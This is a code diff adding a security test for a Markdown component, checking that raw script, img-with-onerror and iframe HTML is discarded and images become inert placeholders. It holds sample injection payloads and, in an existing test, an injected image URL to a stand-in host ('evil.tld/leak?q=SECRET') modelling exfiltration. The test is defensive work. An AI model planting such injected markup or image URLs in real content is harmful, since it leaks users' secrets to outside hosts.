@@ -4,6 +4,22 @@ import { Markdown, safeUrlTransform } from "./Markdown";
 
 /** S4 (security hardening) — untrusted markdown must not fetch anything. */
 describe("Markdown", () => {
+  it("discards raw HTML in Skill Preview while preserving Markdown and inert image placeholders", () => {
+    const source = [
+      "# Review guidance",
+      '<script>/* raw script */</script>',
+      '<img src="https://example.invalid/raw.png" onerror="void 0">',
+      '<iframe src="https://example.invalid/embed"></iframe>',
+      "![diagram](https://example.invalid/diagram.png)",
+    ].join("\n\n");
+    const { container } = render(<Markdown skipHtml>{source}</Markdown>);
+
+    expect(screen.getByRole("heading", { name: "Review guidance" })).toBeInTheDocument();
+    expect(container.querySelector("script, img, iframe, [onerror]")).toBeNull();
+    expect(container).not.toHaveTextContent("raw script");
+    expect(screen.getByTestId("md-image-placeholder")).toHaveTextContent("https://example.invalid/diagram.png");
+  });
+
   it("never renders an <img>, so an injected image URL is not fetched", () => {
     const { container } = render(
       <Markdown>{"Looks fine ![x](https://evil.tld/leak?q=SECRET) done"}</Markdown>,
